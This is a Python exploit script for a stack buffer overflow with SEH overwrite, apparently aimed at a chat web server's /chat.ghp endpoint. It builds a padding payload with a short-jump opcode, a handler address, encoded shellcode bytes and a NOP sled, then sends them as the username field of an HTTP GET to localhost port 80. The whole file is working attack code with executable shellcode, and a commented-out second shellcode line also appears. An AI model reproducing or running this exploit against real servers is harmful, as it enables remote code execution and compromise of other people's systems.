import struct
from socket import *

PAYLOAD = "X"
PAYLOAD += "AAAA"*10  #0x41
PAYLOAD += "BBBB"*10  #0x42
PAYLOAD += "CCCC"*10  #0x43
PAYLOAD += "DDDD"*10  #0x44
PAYLOAD += "EEEE"*10  #0x45


PAYLOAD += "0000"    #0x30
PAYLOAD += "1111"    #0x31
PAYLOAD += "2222"    #0x32
PAYLOAD += "3333"    #0x33
PAYLOAD += "\xeb\x06\x90\x90"    #0x34  #OPCODE JMP SHORT
PAYLOAD += struct.pack('<L', 0x100186e5)    #0x35   # SEH handler
PAYLOAD += "\x90\x90\x90\x90"*1    #0x36


#PAYLOAD += "\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F"


buf =  b""
buf += b"\x89\xe3\xd9\xc7\xd9\x73\xf4\x5b\x53\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x69\x78\x4f"
buf += b"\x72\x43\x30\x37\x70\x43\x30\x31\x70\x4f\x79\x78\x65"
buf += b"\x36\x51\x69\x50\x52\x44\x6c\x4b\x36\x30\x36\x50\x4c"
buf += b"\x4b\x62\x72\x66\x6c\x6e\x6b\x72\x72\x54\x54\x6e\x6b"
buf += b"\x70\x72\x75\x78\x54\x4f\x48\x37\x50\x4a\x74\x66\x76"
buf += b"\x51\x4b\x4f\x6c\x6c\x37\x4c\x50\x61\x43\x4c\x73\x32"
buf += b"\x46\x4c\x37\x50\x7a\x61\x68\x4f\x34\x4d\x37\x71\x6f"
buf += b"\x37\x6b\x52\x5a\x52\x30\x52\x53\x67\x4c\x4b\x46\x32"
buf += b"\x54\x50\x4c\x4b\x62\x6a\x57\x4c\x6e\x6b\x50\x4c\x46"
buf += b"\x71\x71\x68\x6a\x43\x43\x78\x45\x51\x78\x51\x33\x61"
buf += b"\x6e\x6b\x32\x79\x71\x30\x73\x31\x6b\x63\x6e\x6b\x62"
buf += b"\x69\x77\x68\x69\x73\x65\x6a\x50\x49\x4e\x6b\x65\x64"
buf += b"\x6c\x4b\x75\x51\x68\x56\x34\x71\x79\x6f\x4c\x6c\x69"
buf += b"\x51\x38\x4f\x54\x4d\x37\x71\x78\x47\x44\x78\x79\x70"
buf += b"\x51\x65\x68\x76\x64\x43\x61\x6d\x78\x78\x47\x4b\x71"
buf += b"\x6d\x36\x44\x31\x65\x5a\x44\x71\x48\x4c\x4b\x76\x38"
buf += b"\x56\x44\x65\x51\x39\x43\x52\x46\x4c\x4b\x74\x4c\x32"
buf += b"\x6b\x6c\x4b\x53\x68\x57\x6c\x63\x31\x68\x53\x4c\x4b"
buf += b"\x33\x34\x4e\x6b\x57\x71\x6a\x70\x4e\x69\x70\x44\x37"
buf += b"\x54\x66\x44\x31\x4b\x51\x4b\x45\x31\x51\x49\x32\x7a"
buf += b"\x46\x31\x69\x6f\x69\x70\x71\x4f\x63\x6f\x72\x7a\x6e"
buf += b"\x6b\x67\x62\x68\x6b\x4c\x4d\x73\x6d\x52\x4a\x46\x61"
buf += b"\x6c\x4d\x6f\x75\x6f\x42\x77\x70\x37\x70\x35\x50\x50"
buf += b"\x50\x73\x58\x75\x61\x4c\x4b\x70\x6f\x6c\x47\x39\x6f"
buf += b"\x58\x55\x4f\x4b\x5a\x50\x4e\x55\x4e\x42\x66\x36\x33"
buf += b"\x58\x6f\x56\x6f\x65\x4d\x6d\x4f\x6d\x59\x6f\x7a\x75"
buf += b"\x67\x4c\x33\x36\x53\x4c\x37\x7a\x4d\x50\x49\x6b\x6b"
buf += b"\x50\x51\x65\x36\x65\x4f\x4b\x42\x67\x34\x53\x62\x52"
buf += b"\x50\x6f\x50\x6a\x45\x50\x73\x63\x4b\x4f\x38\x55\x73"
buf += b"\x53\x63\x51\x32\x4c\x45\x33\x46\x4e\x31\x75\x53\x48"
buf += b"\x63\x55\x67\x70\x41\x41"

NOP = "\x90"*400


print("[*] Sending Packet...")

s = socket(AF_INET,SOCK_STREAM,0)
s.connect(('127.0.0.1',80))
s.send("GET /chat.ghp?username=" + PAYLOAD + buf + NOP + "&password=&room=1&sex=1 HTTP/1.1\r\n\r\n")

try:
    s.recv(150)
except:
    print("[*] Exploit!")


s.close()
